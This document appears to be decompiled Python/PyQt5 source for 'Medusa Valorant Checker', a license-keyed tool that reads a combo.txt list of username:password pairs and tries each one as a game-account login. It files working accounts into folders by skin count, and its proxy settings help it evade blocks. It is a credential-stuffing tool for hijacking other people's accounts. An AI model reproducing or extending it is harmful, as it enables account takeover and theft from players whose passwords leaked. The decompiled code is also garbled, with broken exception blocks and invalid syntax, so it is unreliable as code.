import os
import sys
import json
import base64
import time
import urllib.parse
import requests
from datetime import datetime
import webview
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, QTextEdit, QProgressBar, QFileDialog, QListWidget, QLineEdit, QGroupBox, QMessageBox, QScrollArea, QGridLayout, QDialog, QRadioButton, QSizePolicy, QStackedWidget
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QPixmap, QPainter, QPainterPath, QBrush, QColor, QPalette, QIcon
from modern_settings_dialog import ModernSettingsDialog
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QUrl, QTimer
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QPainterPath, QCursor
import PyQt5.QtCore as QtCore
COMBO_FILE = 'combo.txt'
KEY_FILE = 'api_key.json'
CONFIG_FILE = 'config.json'
AVATAR_FOLDER = 'assets'
DEFAULT_AVATAR_URL = 'https://habnet.pw/logolar/default111.jpg'
LOGO_URL = 'https://habnet.pw/logolar/medusa.png'
LOGO_LOCAL_PATH = os.path.join(AVATAR_FOLDER, 'medusa.png')
APP_ICON_URL = 'https://habnet.pw/logolar/vaclogo.ico'
DISCORD_ICON_URL = 'https://www.svgrepo.com/show/353655/discord-icon.svg'
os.makedirs(AVATAR_FOLDER, exist_ok=True)
working_accounts_dir = 'working_accounts'
os.makedirs(working_accounts_dir, exist_ok=True)
skin_folders = {'0-4': (0, 4), '5-10': (5, 10), '10-20': (10, 20), '20-30': (20, 30), '30andmore': (30, float('inf'))}
for folder_name in skin_folders:
    os.makedirs(os.path.join(working_accounts_dir, folder_name), exist_ok=True)
def get_config():
    # irreducible cflow, using cdg fallback
    return True if os.path.exists(CONFIG_FILE) and open(CONFIG_FILE, 'r') as f, json.load(f)
                            return {'avatar_path': '', 'proxy_enabled': False, 'proxy_host': '', 'proxy_port': ''}
                    except (IOError, json.JSONDecodeError):
                            pass
def save_config(config):
    # irreducible cflow, using cdg fallback
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
                except IOError as e:
                        print(f'Hata: Konfigürasyon dosyası kaydedilemedi. {e}')
def get_modern_palette():
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(18, 18, 18))
    palette.setColor(QPalette.WindowText, QColor(255, 255, 255))
    palette.setColor(QPalette.Base, QColor(28, 28, 28))
    palette.setColor(QPalette.AlternateBase, QColor(38, 38, 38))
    palette.setColor(QPalette.ToolTipBase, QColor(45, 45, 45))
    palette.setColor(QPalette.ToolTipText, QColor(255, 255, 255))
    palette.setColor(QPalette.Text, QColor(255, 255, 255))
    palette.setColor(QPalette.Button, QColor(0, 122, 255))
    palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
    palette.setColor(QPalette.BrightText, QColor(255, 69, 58))
    palette.setColor(QPalette.Link, QColor(10, 132, 255))
    palette.setColor(QPalette.Highlight, QColor(0, 122, 255))
    palette.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
    return palette
def download_image(url, path):
    # irreducible cflow, using cdg fallback
    print(f'İndiriliyor: {url} -> {path}')
    response = requests.get(url, stream=True, timeout=10)
    print(f'HTTP Status: {response.status_code}')
    if response.status_code == 200:
        with open(path, 'wb') as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)
        print(f'İndirme tamamlandı: {path}')
            return True
        print(f'İndirme başarısız: HTTP {response.status_code}')
            return True
            except Exception as e:
                    print(f'Resim indirme hatası: {e}')
                        return True
def get_rounded_pixmap(pixmap, size):
    round_pixmap = QPixmap(size, size)
    round_pixmap.fill(Qt.transparent)
    path = QPainterPath()
    path.addRoundedRect(0, 0, size, size, size / 2, size / 2)
    painter = QPainter(round_pixmap)
    painter.setRenderHint(QPainter.Antialiasing)
    painter.setClipPath(path)
    painter.drawPixmap(0, 0, pixmap.scaled(size, size, Qt.KeepAspectRatio, Qt.SmoothTransformation))
    painter.end()
    return round_pixmap
class SettingsWidget(QWidget):
    avatar_changed = pyqtSignal(str)
    proxy_changed = pyqtSignal(dict)
    go_back_requested = pyqtSignal()
    def __init__(self, parent=None):
        super().__init__(parent)
        self.config = get_config()
        self.init_ui()
    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(30, 30, 30, 30)
        main_layout.setSpacing(20)
        avatar_group = QGroupBox('👤 Avatar Ayarları')
        avatar_layout = QVBoxLayout()
        avatar_layout.setSpacing(15)
        self.avatar_label = QLabel()
        self.avatar_label.setFixedSize(150, 150)
        self.avatar_label.setAlignment(Qt.AlignCenter)
        self.avatar_label.setStyleSheet('\n            QLabel {\n                border: none;\n                border-radius: 75px;\n                background-color: transparent;\n            }\n        ')
        self.update_avatar_display()
        avatar_button = QPushButton('📁 CHANGE AVATAR')
        avatar_button.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #007AFF, stop:1 #0056b3);\n                color: #FFFFFF;\n                border: 2px solid #007AFF;\n                font-weight: 800;\n                font-size: 14px;\n                padding: 15px 25px;\n                border-radius: 12px;\n                min-height: 20px;\n                text-transform: uppercase;\n                letter-spacing: 0.5px;\n                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);\n            }\n            QPushButton:hover {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #1a8cff, stop:1 #0066cc);\n                transform: translateY(-2px);\n                box-shadow: 0 6px 20px rgba(0, 122, 255, 0.4);\n            }\n            QPushButton:pressed {\n                transform: translateY(1px);\n                box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);\n            }\n        ')
        avatar_button.clicked.connect(self.change_avatar)
        avatar_layout.addWidget(self.avatar_label, alignment=Qt.AlignCenter)
        avatar_layout.addWidget(avatar_button)
        avatar_group.setLayout(avatar_layout)
        proxy_group = QGroupBox('🌐 Proxy Ayarları')
        proxy_layout = QVBoxLayout()
        proxy_layout.setSpacing(15)
        self.proxy_enabled_cb = QPushButton('ENABLE PROXY')
        self.proxy_enabled_cb.setCheckable(True)
        self.proxy_enabled_cb.setChecked(self.config.get('proxy_enabled', False))
        self.proxy_enabled_cb.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #3A3A3C, stop:1 #2C2C2E);\n                color: #FFFFFF;\n                border: 2px solid #48484A;\n                padding: 15px 25px;\n                border-radius: 12px;\n                font-size: 15px;\n                font-weight: 800;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n                min-height: 20px;\n                text-transform: uppercase;\n                letter-spacing: 0.5px;\n                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);\n            }\n            QPushButton:checked {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #34C759, stop:1 #28A745);\n                border-color: #34C759;\n                box-shadow: 0 2px 8px rgba(52, 199, 89, 0.3);\n            }\n            QPushButton:hover {\n                border-color: #007AFF;\n                transform: translateY(-1px);\n            }\n            QPushButton:pressed {\n                transform: translateY(1px);\n            }\n        ')
        proxy_host_layout = QHBoxLayout()
        proxy_host_label = QLabel('Host:')
        self.proxy_host_input = QLineEdit()
        self.proxy_host_input.setPlaceholderText('örn: 127.0.0.1')
        self.proxy_host_input.setText(self.config.get('proxy_host', ''))
        self.proxy_host_input.setStyleSheet('\n            QLineEdit {\n                background-color: #2C2C2E;\n                color: #FFFFFF;\n                border: 2px solid #48484A;\n                border-radius: 12px;\n                padding: 18px 25px;\n                font-size: 15px;\n                font-weight: 500;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n                selection-background-color: #007AFF;\n                min-height: 20px;\n            }\n            QLineEdit:focus {\n                border-color: #007AFF;\n                background-color: #1C1C1E;\n            }\n        ')
        proxy_host_layout.addWidget(proxy_host_label)
        proxy_host_layout.addWidget(self.proxy_host_input)
        proxy_port_layout = QHBoxLayout()
        proxy_port_label = QLabel('Port:')
        self.proxy_port_input = QLineEdit()
        self.proxy_port_input.setPlaceholderText('örn: 8080')
        self.proxy_port_input.setText(self.config.get('proxy_port', ''))
        self.proxy_port_input.setStyleSheet('\n            QLineEdit {\n                background-color: #2C2C2E;\n                color: #FFFFFF;\n                border: 2px solid #48484A;\n                border-radius: 12px;\n                padding: 18px 25px;\n                font-size: 15px;\n                font-weight: 500;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n                selection-background-color: #007AFF;\n                min-height: 20px;\n            }\n            QLineEdit:focus {\n                border-color: #007AFF;\n                background-color: #1C1C1E;\n            }\n        ')
        proxy_port_layout.addWidget(proxy_port_label)
        proxy_port_layout.addWidget(self.proxy_port_input)
        proxy_test_button = QPushButton('🔍 TEST PROXY')
        proxy_test_button.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #FF9500, stop:1 #FF6B00);\n                color: #FFFFFF;\n                border: 2px solid #FF9500;\n                padding: 15px 25px;\n                border-radius: 12px;\n                font-size: 14px;\n                font-weight: 800;\n                text-transform: uppercase;\n                letter-spacing: 0.5px;\n                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);\n            }\n            QPushButton:hover {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #FFB84D, stop:1 #FF9500);\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(255, 149, 0, 0.4);\n            }\n            QPushButton:pressed {\n                transform: translateY(1px);\n                box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);\n            }\n        ')
        proxy_test_button.clicked.connect(self.test_proxy)
        proxy_layout.addWidget(self.proxy_enabled_cb)
        proxy_layout.addLayout(proxy_host_layout)
        proxy_layout.addLayout(proxy_port_layout)
        proxy_layout.addWidget(proxy_test_button)
        proxy_group.setLayout(proxy_layout)
        self.proxy_enabled_cb.toggled.connect(self.save_proxy_settings)
        self.proxy_host_input.textChanged.connect(self.save_proxy_settings)
        self.proxy_port_input.textChanged.connect(self.save_proxy_settings)
        back_button = QPushButton('⬅️ BACK TO MAIN')
        back_button.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #8E8E93, stop:1 #636366);\n                color: #FFFFFF;\n                border: 2px solid #8E8E93;\n                padding: 15px 30px;\n                border-radius: 12px;\n                font-size: 15px;\n                font-weight: 800;\n                text-transform: uppercase;\n                letter-spacing: 0.5px;\n                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);\n            }\n            QPushButton:hover {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #A8A8AD, stop:1 #8E8E93);\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(142, 142, 147, 0.3);\n            }\n            QPushButton:pressed {\n                transform: translateY(1px);\n                box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);\n            }\n        ')
        back_button.clicked.connect(self.go_back_requested.emit)
        main_layout.addWidget(avatar_group)
        main_layout.addWidget(proxy_group)
        main_layout.addStretch(1)
        main_layout.addWidget(back_button)
        self.setLayout(main_layout)
    def save_proxy_settings(self):
        self.config['proxy_enabled'] = self.proxy_enabled_cb.isChecked()
        self.config['proxy_host'] = self.proxy_host_input.text()
        self.config['proxy_port'] = self.proxy_port_input.text()
        save_config(self.config)
        self.proxy_changed.emit({'enabled': self.config['proxy_enabled'], 'host': self.config['proxy_host'], 'port': self.config['proxy_port']})
    def test_proxy(self):
        # irreducible cflow, using cdg fallback
        if not self.proxy_host_input.text() or not self.proxy_port_input.text():
            QMessageBox.warning(self, 'Uyarı', 'Lütfen proxy host ve port bilgilerini girin.')
            return
        import requests
        proxies = {'http': f'http://{self.proxy_host_input.text()}:{self.proxy_port_input.text()}', 'https': f'http://{self.proxy_host_input.text()}:{self.proxy_port_input.text()}'}
        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
        if response.status_code == 200:
            QMessageBox.information(self, 'Başarılı', f'Proxy çalışıyor!\nIP: {response.json().get('origin', 'Bilinmiyor')}')
            QMessageBox.warning(self, 'Hata', 'Proxy bağlantısı başarısız.')
                except Exception as e:
                        QMessageBox.critical(self, 'Hata', f'Proxy test edilemedi: {str(e)}')
    def change_avatar(self):
        file_path, _ = QFileDialog.getOpenFileName(self, 'Avatar Seç', '', 'Resim Dosyaları (*.png *.jpg *.jpeg)')
        if file_path:
            self.config['avatar_path'] = file_path
            save_config(self.config)
            self.update_avatar_display()
            self.avatar_changed.emit(file_path)
            QMessageBox.information(self, 'Başarılı', 'Avatar başarıyla güncellendi.')
    def update_avatar_display(self):
        avatar_path = self.config.get('avatar_path')
        if not avatar_path or not os.path.exists(avatar_path):
            avatar_path = os.path.join(AVATAR_FOLDER, 'default_avatar.jpg')
            download_image(DEFAULT_AVATAR_URL, avatar_path)
            self.config['avatar_path'] = avatar_path
            save_config(self.config)
        pixmap = QPixmap(avatar_path)
        if not pixmap.isNull():
            rounded_pixmap = get_rounded_pixmap(pixmap, 150)
            self.avatar_label.setPixmap(rounded_pixmap)
        else:
            self.avatar_label.setText('❌\nResim\nYüklenemedi')
            self.avatar_label.setAlignment(Qt.AlignCenter)
class WorkerThread(QThread):
    update_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal()
    login_request_signal = pyqtSignal(str, str)
    def __init__(self, combos):
        super().__init__()
        self.combos = combos
        self.running = True
    def run(self):
        total = len(self.combos)
        for i, (username, password) in enumerate(self.combos):
            if not self.running:
                break
            else:
                self.update_signal.emit(f'🔹 {i + 1}/{total} -> {username}:{password} deneniyor...')
                self.progress_signal.emit(int((i + 1) / total * 100))
                self.login_request_signal.emit(username, password)
                time.sleep(2)
        self.finished_signal.emit()
class KeyLoginWindow(QMainWindow):
    PHP_KEY_VALIDATION_URL = 'https://habnet.pw/key_kontrol.php'
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Medusa Valorant Checker - Giriş')
        self.setGeometry(100, 100, 600, 800)
        self.setStyleSheet(self.get_modern_stylesheet())
        self.init_ui()
    def get_modern_stylesheet(self):
        return '\n            QMainWindow { \n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #0A0A0A, stop:1 #1A1A1A, stop:0.5 #151515); \n                border: none;\n            }\n            QWidget {\n                background: transparent;\n            }\n            QLabel { \n                color: #FFFFFF; \n                font-size: 15px; \n                font-weight: 600;\n                letter-spacing: 0.5px;\n            }\n            QLineEdit { \n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,\n                    stop:0 #2A2A2E, stop:1 #1E1E22);\n                color: #FFFFFF; \n                border: 2px solid transparent;\n                border-radius: 16px; \n                padding: 18px 24px; \n                font-size: 15px;\n                font-weight: 500;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n                selection-background-color: #007AFF;\n                min-height: 20px;\n            }\n            QLineEdit:focus {\n                border: 2px solid #007AFF;\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,\n                    stop:0 #1C1C20, stop:1 #141418);\n                box-shadow: 0 0 20px rgba(0, 122, 255, 0.3);\n            }\n            QLineEdit:hover {\n                border: 2px solid #4A90E2;\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,\n                    stop:0 #252529, stop:1 #19191D);\n            }\n            QPushButton { \n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #007AFF, stop:0.5 #4A90E2, stop:1 #5856D6); \n                color: #FFFFFF; \n                border: none; \n                padding: 18px 36px; \n                border-radius: 16px; \n                font-size: 16px; \n                font-weight: bold;\n                letter-spacing: 1px;\n            }\n            QPushButton:hover { \n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #0066FF, stop:0.5 #3D7BD6, stop:1 #4A47B8);\n                transform: translateY(-3px);\n                box-shadow: 0 8px 25px rgba(0, 122, 255, 0.4);\n            }\n            QPushButton:pressed { \n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #0052CC, stop:0.5 #2E5FA8, stop:1 #3D3A9A);\n                transform: translateY(-1px);\n            }\n            QPushButton:disabled {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,\n                    stop:0 #3A3A3E, stop:1 #2E2E32);\n                color: #8E8E93;\n            }\n            #title { \n                font-size: 38px; \n                font-weight: 900; \n                color: #FFFFFF;\n                text-align: center;\n                letter-spacing: 2px;\n                text-shadow: 0 0 30px rgba(0, 122, 255, 0.5);\n            }\n            #subtitle {\n                font-size: 17px;\n                color: #B0B0B5;\n                text-align: center;\n                font-weight: 500;\n                letter-spacing: 0.8px;\n            }\n            #keyInstruction {\n                font-size: 16px;\n                color: #FFFFFF;\n                font-weight: 700;\n                text-align: center;\n                letter-spacing: 0.5px;\n            }\n            #footer {\n                font-size: 13px;\n                color: #6A6A70;\n                text-align: center;\n                font-weight: 400;\n            }\n        '
    def init_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(50, 50, 50, 50)
        main_layout.setSpacing(30)
        main_layout.setAlignment(Qt.AlignCenter)
        logo_container = QWidget()
        logo_container.setFixedSize(140, 140)
        logo_container.setStyleSheet('\n            QWidget {\n                background: transparent;\n                border: none;\n            }\n        ')
        logo_layout = QVBoxLayout(logo_container)
        logo_layout.setContentsMargins(0, 0, 0, 0)
        logo_layout.setAlignment(Qt.AlignCenter)
        self.logo_label = QLabel()
        self.logo_label.setFixedSize(120, 120)
        self.logo_label.setAlignment(Qt.AlignCenter)
        self.logo_label.setStyleSheet('\n            QLabel {\n                background: transparent;\n                border: none;\n                qproperty-alignment: AlignCenter;\n            }\n        ')
        logo_layout.addWidget(self.logo_label, alignment=Qt.AlignCenter)
        self.load_logo()
        title_label = QLabel('Medusa')
        title_label.setObjectName('title')
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setWordWrap(False)
        subtitle_label = QLabel('VALORANT ACCOUNT CHECKER')
        subtitle_label.setObjectName('subtitle')
        subtitle_label.setAlignment(Qt.AlignCenter)
        subtitle_label.setWordWrap(False)
        tagline_label = QLabel('Premium • Secure • Lightning Fast')
        tagline_label.setAlignment(Qt.AlignCenter)
        tagline_label.setWordWrap(False)
        tagline_label.setStyleSheet('\n            QLabel {\n                color: #007AFF;\n                font-size: 14px;\n                font-weight: 600;\n                letter-spacing: 1px;\n            }\n        ')
        key_section = QWidget()
        key_section.setFixedWidth(400)
        key_section.setStyleSheet('\n            QWidget {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,\n                    stop:0 rgba(255, 255, 255, 0.05),\n                    stop:1 rgba(255, 255, 255, 0.02));\n                border: 1px solid rgba(255, 255, 255, 0.1);\n                border-radius: 20px;\n                padding: 30px;\n            }\n        ')
        key_layout = QVBoxLayout(key_section)
        key_layout.setSpacing(20)
        key_label = QLabel('🔐 ENTER YOUR LICENSE KEY')
        key_label.setObjectName('keyInstruction')
        key_label.setAlignment(Qt.AlignCenter)
        key_label.setWordWrap(False)
        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText('🔑 ENTER YOUR LICENSE KEY')
        self.key_input.setEchoMode(QLineEdit.Password)
        self.key_input.setObjectName('keyInput')
        self.login_btn = QPushButton('🚀 AUTHENTICATE')
        self.login_btn.setFixedHeight(60)
        self.login_btn.clicked.connect(self.check_key)
        key_layout.addWidget(key_label)
        key_layout.addWidget(self.key_input)
        key_layout.addWidget(self.login_btn)
        self.status_label = QLabel('')
        self.status_label.setAlignment(Qt.AlignCenter)
        self.status_label.setObjectName('statusLabel')
        self.status_label.setWordWrap(False)
        self.status_label.setStyleSheet('\n            QLabel {\n                font-size: 15px;\n                padding: 15px 25px;\n                border-radius: 12px;\n                background: rgba(255, 255, 255, 0.05);\n                border: 1px solid rgba(255, 255, 255, 0.1);\n                font-weight: 500;\n            }\n        ')
        footer_label = QLabel('© 2024 MEDUSA SYSTEMS • ALL RIGHTS RESERVED')
        footer_label.setObjectName('footer')
        footer_label.setAlignment(Qt.AlignCenter)
        footer_label.setWordWrap(False)
        security_badge = QLabel('🛡️ SECURED BY ADVANCED ENCRYPTION')
        security_badge.setAlignment(Qt.AlignCenter)
        security_badge.setWordWrap(False)
        security_badge.setStyleSheet('\n            QLabel {\n                color: #30D158;\n                font-size: 12px;\n                font-weight: 600;\n                letter-spacing: 0.5px;\n            }\n        ')
        main_layout.addWidget(logo_container, alignment=Qt.AlignCenter)
        main_layout.addSpacing(10)
        main_layout.addWidget(title_label)
        main_layout.addWidget(subtitle_label)
        main_layout.addWidget(tagline_label)
        main_layout.addSpacing(25)
        main_layout.addWidget(key_section, alignment=Qt.AlignCenter)
        main_layout.addSpacing(15)
        main_layout.addWidget(self.status_label)
        main_layout.addStretch(1)
        main_layout.addWidget(security_badge)
        main_layout.addWidget(footer_label)
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
    def load_logo(self):
        logo_path = LOGO_LOCAL_PATH
        print(f'Login logo yolu: {logo_path}')
        print(f'Login logo dosyası var mı: {os.path.exists(logo_path)}')
        if not os.path.exists(logo_path):
            print('Login logo dosyası bulunamadı, indiriliyor...')
            download_image(LOGO_URL, logo_path)
        if os.path.exists(logo_path):
            pixmap = QPixmap(logo_path)
            print(f'Login pixmap yüklendi: {not pixmap.isNull()}')
            if not pixmap.isNull():
                scaled_pixmap = pixmap.scaled(100, 100, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                self.logo_label.setPixmap(scaled_pixmap)
                self.logo_label.setStyleSheet('\n                    QLabel {\n                        background-color: #ffffff;\n                        border: 2px solid #e0e0e0;\n                        border-radius: 60px;\n                        padding: 8px;\n                        min-width: 120px;\n                        min-height: 120px;\n                        max-width: 120px;\n                        max-height: 120px;\n                    }\n                ')
                print('Login logo loaded successfully')
            else:
                print('Using login fallback display')
                self.logo_label.setText('⚡\nMedusa')
                self.logo_label.setAlignment(Qt.AlignCenter)
                self.logo_label.setStyleSheet('\n                    QLabel {\n                        color: #007AFF;\n                        font-size: 20px;\n                        font-weight: bold;\n                        text-align: center;\n                        background-color: #ffffff;\n                        border: 2px solid #e0e0e0;\n                        border-radius: 60px;\n                        padding: 10px;\n                        min-width: 120px;\n                        min-height: 120px;\n                        max-width: 120px;\n                        max-height: 120px;\n                    }\n                ')
        else:
            print('Using login fallback logo')
            self.logo_label.setText('⚡\nMedusa')
            self.logo_label.setAlignment(Qt.AlignCenter)
            self.logo_label.setStyleSheet('\n                QLabel {\n                    color: #007AFF;\n                    font-size: 20px;\n                    font-weight: bold;\n                    text-align: center;\n                    background-color: #ffffff;\n                    border: 2px solid #e0e0e0;\n                    border-radius: 60px;\n                    padding: 10px;\n                    min-width: 120px;\n                    min-height: 120px;\n                    max-width: 120px;\n                    max-height: 120px;\n                }\n            ')
    def check_key(self):
        # irreducible cflow, using cdg fallback
        key = self.key_input.text().strip()
        if not key:
            self.status_label.setText('⚠️ Lisans anahtarı boş bırakılamaz!')
            self.status_label.setStyleSheet('\n                QLabel {\n                    color: #FF453A;\n                    background-color: rgba(255, 69, 58, 0.1);\n                    border: 1px solid #FF453A;\n                }\n            ')
            return
        else:
            self.status_label.setText('🔄 Lisans anahtarı kontrol ediliyor...')
            self.status_label.setStyleSheet('\n            QLabel {\n                color: #FF9F0A;\n                background-color: rgba(255, 159, 10, 0.1);\n                border: 1px solid #FF9F0A;\n            }\n        ')
            self.login_btn.setEnabled(False)
        response = requests.post(self.PHP_KEY_VALIDATION_URL, data={'key': key}, timeout=10)
        response_json = response.json()
        if response_json.get('status') == 'success':
            message = response_json.get('message', 'Anahtar geçerli.')
            expires_at_str = response_json.get('expires_at')
            self.save_key_to_file(key, expires_at_str)
            self.status_label.setText(f'✅ {message}')
            self.status_label.setStyleSheet('\n                    QLabel {\n                        color: #30D158;\n                        background-color: rgba(48, 209, 88, 0.1);\n                        border: 1px solid #30D158;\n                    }\n                ')
            QMessageBox.information(self, '🎉 Başarılı', f'Giriş başarılı!\n\n🔑 Anahtarınızın süresi:\n{expires_at_str} tarihinde dolacaktır.')
            self.main_window = MainWindow()
            self.main_window.show()
            self.close()
            message = response_json.get('message', 'Geçersiz anahtar.')
            self.status_label.setText(f'❌ {message}')
            self.status_label.setStyleSheet('\n                    QLabel {\n                        color: #FF453A;\n                        background-color: rgba(255, 69, 58, 0.1);\n                        border: 1px solid #FF453A;\n                    }\n                ')
            self.login_btn.setEnabled(True)
            QMessageBox.critical(self, '❌ Hata', message)
                except requests.exceptions.RequestException as e:
                        self.status_label.setText('🌐 Bağlantı hatası: Sunucuya erişilemiyor')
                        self.status_label.setStyleSheet('\n                QLabel {\n                    color: #FF453A;\n                    background-color: rgba(255, 69, 58, 0.1);\n                    border: 1px solid #FF453A;\n                }\n            ')
                        self.login_btn.setEnabled(True)
                    except json.JSONDecodeError:
                        self.status_label.setText('📡 Sunucudan hatalı yanıt geldi')
                        self.status_label.setStyleSheet('\n                QLabel {\n                    color: #FF453A;\n                    background-color: rgba(255, 69, 58, 0.1);\n                    border: 1px solid #FF453A;\n                }\n            ')
                        self.login_btn.setEnabled(True)
                        except Exception as e:
                                self.status_label.setText(f'⚠️ Beklenmeyen hata: {str(e)[:50]}...')
                                self.status_label.setStyleSheet('\n                QLabel {\n                    color: #FF453A;\n                    background-color: rgba(255, 69, 58, 0.1);\n                    border: 1px solid #FF453A;\n                }\n            ')
                                self.login_btn.setEnabled(True)
    def save_key_to_file(self, key, expires_at):
        # irreducible cflow, using cdg fallback
        data = {'key': key, 'expires_at': expires_at}
        with open(KEY_FILE, 'w') as f:
            json.dump(data, f)
                    except Exception as e:
                            print(f'Hata: Anahtar dosyaya kaydedilemedi. {e}')
class MainWindow(QMainWindow):
    result_signal = pyqtSignal(dict)
    error_messages = ['Your username or password may be incorrect', 'Kullanıcı adın veya şifren yanlış olabilir', '用户名或密码可能不正确', 'El nombre de usuario o la contraseña pueden ser incorrectos', 'Le nom d\'utilisateur ou le mot de passe peut être incorrect', 'Der Benutzername oder das Passwort ist möglicherweise falsch', 'Неверное имя пользователя или пароль', 'ユーザー名またはパスワードが間違っている可能性があります']
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Medusa Valorant Checker')
        self.setGeometry(100, 100, 1000, 800)
        self.config = get_config()
        icon_path = os.path.join(AVATAR_FOLDER, 'vaclogo.ico')
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))
        else:
            download_image(APP_ICON_URL, icon_path)
            if os.path.exists(icon_path):
                self.setWindowIcon(QIcon(icon_path))
        self.apply_modern_theme()
        self.stacked_widget = QStackedWidget()
        self.setCentralWidget(self.stacked_widget)
        self.init_ui()
        self.worker_thread = None
        self.success_count = 0
        self.failed_count = 0
        self.windows = []
        self.load_images()
        self.key_data = self.load_key_data()
        self.key_expires = self.get_key_expiration()
        self.update_key_label()
    def init_ui(self):
        self.main_widget = QWidget()
        self.init_main_view()
        self.stacked_widget.addWidget(self.main_widget)
        self.settings_widget = SettingsWidget()
        self.settings_widget.avatar_changed.connect(self.update_avatar_display)
        self.settings_widget.proxy_changed.connect(self.update_proxy_settings)
        self.settings_widget.go_back_requested.connect(self.show_main_view)
        self.stacked_widget.addWidget(self.settings_widget)
    def load_key_data(self):
        # irreducible cflow, using cdg fallback
        return
            return
                        except (IOError, json.JSONDecodeError):
                                return None
    def get_key_expiration(self):
        if self.key_data and 'expires_at' in self.key_data:
            try:
                return datetime.strptime(self.key_data['expires_at'], '%Y-%m-%d %H:%M:%S')
            except (ValueError, TypeError):
                return None
        else:
            return None
    def update_key_label(self):
        if self.key_expires:
            remaining_time = self.key_expires - datetime.now()
            if remaining_time.total_seconds() > 0:
                days = remaining_time.days
                hours = remaining_time.seconds // 3600
                minutes = remaining_time.seconds // 60 % 60
                self.key_label.setText(f'Anahtar Süresi: {days} gün, {hours} saat, {minutes} dakika')
            else:
                self.key_label.setText('Anahtarın süresi doldu!')
        else:
            self.key_label.setText('Anahtar süresi bilinmiyor.')
    def get_modern_stylesheet(self):
        return '\n            QMainWindow { \n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #121212, stop:1 #1E1E1E); \n            }\n            QWidget { \n                background-color: transparent;\n                color: #FFFFFF;\n            }\n            QGroupBox {\n                border: 2px solid #007AFF;\n                border-radius: 15px;\n                margin-top: 25px;\n                font-size: 18px;\n                font-weight: bold;\n                color: #FFFFFF;\n                padding-top: 15px;\n            }\n            QGroupBox::title {\n                subcontrol-origin: margin;\n                left: 15px;\n                padding: 0 10px;\n                color: #007AFF;\n                font-weight: 600;\n            }\n            QLabel { \n                color: #FFFFFF; \n                font-size: 14px;\n                font-weight: 500;\n            }\n            QLineEdit {\n                background-color: #2C2C2E;\n                color: #FFFFFF;\n                border: 2px solid #48484A;\n                border-radius: 12px;\n                padding: 12px 16px;\n                font-size: 14px;\n                font-weight: 500;\n            }\n            QLineEdit:focus {\n                border-color: #007AFF;\n                background-color: #1C1C1E;\n            }\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #007AFF, stop:1 #5856D6);\n                color: #FFFFFF;\n                border: none;\n                padding: 12px 24px;\n                border-radius: 12px;\n                font-size: 14px;\n                font-weight: bold;\n            }\n            QPushButton:hover {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #0056CC, stop:1 #4A47B8);\n            }\n            QPushButton:pressed {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, \n                    stop:0 #004499, stop:1 #3D3A9A);\n            }\n            QPushButton:disabled {\n                background-color: #48484A;\n                color: #8E8E93;\n            }\n            QListWidget {\n                background-color: #2C2C2E;\n                color: #FFFFFF;\n                border: 2px solid #48484A;\n                border-radius: 12px;\n                padding: 8px;\n                font-size: 13px;\n            }\n            QListWidget::item 